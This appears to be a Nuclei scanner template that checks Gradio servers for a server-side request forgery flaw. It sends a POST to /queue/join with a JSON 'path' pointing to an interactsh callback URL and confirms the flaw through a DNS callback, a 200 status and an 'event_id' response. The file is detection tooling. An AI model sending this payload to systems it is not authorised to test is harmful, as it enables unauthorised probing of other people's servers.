id: gradio-gradio-SSRF

info:
  name: gradio-gradio-SSRF
  author: iSee857
  severity: high
  description: |
    gradio-gradio-SSRF
  metadata:
    verified: true
    max-request: 1

http:
  - raw:
      - |
        POST /queue/join? HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"data":[{"path":"http://{{interactsh-url}}"}],"fn_index":0,"session_hash":"123"}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: status
        status:
          - 200
      - type: word  
        words:
          - 'event_id'
